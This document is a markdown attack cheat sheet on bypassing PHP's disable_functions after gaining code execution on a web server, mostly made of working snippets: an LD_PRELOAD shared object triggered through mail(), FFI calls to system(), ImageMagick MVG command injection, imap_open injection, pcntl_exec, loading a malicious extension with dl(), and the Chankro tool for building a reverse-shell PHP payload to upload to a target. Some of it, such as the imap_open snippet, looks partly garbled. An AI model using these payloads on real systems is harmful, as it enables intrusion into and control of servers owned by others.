# PHP disable_functions Bypass

**When**: You have PHP code execution (webshell, SSTI, eval) but `system()`, `exec()`, `passthru()`, `shell_exec()`, `popen()`, `proc_open()` are all in `disable_functions`.

## Check What's Disabled
```php
<?php echo ini_get('disable_functions'); ?>
<?php phpinfo(); ?>  // search for disable_functions
```

## LD_PRELOAD + mail() / mb_send_mail()
**When**: `mail()` or `mb_send_mail()` is not disabled. These spawn `/usr/sbin/sendmail` as a child process, which loads LD_PRELOAD.
```php
<?php
// Step 1: Upload a shared object with a constructor
// evil.c: void __attribute__((constructor)) x(){ system(getenv("CMD")); }
// Compile: gcc -shared -fPIC -o /tmp/evil.so evil.c

// Step 2: Set LD_PRELOAD and trigger
putenv("LD_PRELOAD=/tmp/evil.so");
putenv("CMD=id > /tmp/output");
mail("a", "b", "c");  // spawns sendmail → loads evil.so → runs CMD

// Step 3: Read output
echo file_get_contents("/tmp/output");
?>
```

## FFI (Foreign Function Interface) — PHP 7.4+
**When**: `ffi.enable=preload` or `ffi.enable=true` in php.ini.
```php
<?php
$ffi = FFI::cdef("int system(const char *command);", "libc.so.6");
$ffi->system("id > /tmp/output");
echo file_get_contents("/tmp/output");
?>
```

## ImageMagick (IMagick)
**When**: `Imagick` class is available. ImageMagick has protocol handlers that can execute commands.
```php
<?php
// Uses the "ephemeral" or "msl" protocol
$img = new Imagick();
$img->readImage('ephemeral:/tmp/exploit.msl');
// Or via MVG:
file_put_contents('/tmp/exploit.mvg', 'push graphic-context
viewbox 0 0 640 480
fill "url(https://example.com/\"|id > /tmp/output\")"
pop graphic-context');
$img->readImage('/tmp/exploit.mvg');
?>
```

## imap_open()
**When**: `imap_open()` is available and not disabled.
```php
<?php
// -oProxyCommand injects a command via the SSH proxy
$payload = "x]]\nSHELL\n. NOOP\n0 LOGOUT\n";
$cmd = "id > /tmp/output";
imap_open("{localhost:143/imap}INBOX", "", "", 0, 1,
    array("DISABLE_AUTHENTICATOR" => "x]]\n$cmd\n"));
?>
```

## proc_open via Phar
**When**: `phar://` wrappers are available and `proc_open` isn't fully disabled.
```php
// Build a phar that invokes command execution in its stub
// Upload and access via: phar:///uploads/evil.phar
```

## dl() — Load Extension
**When**: `dl()` is available (rare, usually disabled).
```php
<?php
// Compile a PHP extension that calls system()
dl('/tmp/evil_extension.so');
evil_exec('id');
?>
```

## Chankro
**Automated tool** for LD_PRELOAD + mail() bypass:
```bash
# Generate payload
python2 chankro.py --arch 64 --input rev.sh --output shell.php --path /tmp
# Upload shell.php to the target
```

## pcntl_exec()
**When**: `pcntl` extension is loaded and `pcntl_exec` isn't disabled.
```php
<?php pcntl_exec("/bin/sh", ["-c", "id > /tmp/output"]); ?>
```

## Bypass Decision Tree
```
mail() available?        → LD_PRELOAD + mail()
mb_send_mail() available? → LD_PRELOAD + mb_send_mail()
FFI enabled?             → FFI::cdef + system()
Imagick available?       → MVG/MSL protocol handler
imap_open() available?   → SSH ProxyCommand injection
pcntl_exec() available?  → Direct exec
dl() available?          → Load custom extension
None of the above?       → Check for other PHP functions that spawn processes
```
